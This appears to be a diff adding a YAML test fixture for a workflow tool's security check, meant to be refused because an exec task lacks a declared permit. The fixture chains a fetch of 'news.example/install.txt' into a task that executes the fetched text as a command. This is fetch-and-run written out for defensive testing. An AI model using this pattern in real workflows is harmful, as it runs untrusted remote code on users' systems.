@@ -1,0 +1,21 @@
+# F4 — permit escalation: a declared `permits:` block with NO exec category
+# plus an exec task — default-deny is statically decidable here (no exec
+# grant exists at all, so ANY exec task escapes, rendered command or not),
+# so the capability-escape scan refuses at `nika check` with NIKA-SEC-004.
+# The dynamic-command twin (f4-02, a RENDERED program outside an existing
+# allowlist) is what falls to the runtime gate.
+nika: v1
+workflow:
+  id: f4-01-exec-effect-undeclared
+permits:
+  net: { http: ["news.example"] }
+  tools: ["nika:fetch"]
+tasks:
+  fetch_page:
+    invoke:
+      tool: "nika:fetch"
+      args: { url: "https://news.example/install.txt" }
+  run_it:
+    after: { fetch_page: succeeded }
+    with: { cmd: "${{ tasks.fetch_page.output }}" }
+    exec: { command: ["${{ with.cmd }}"] }
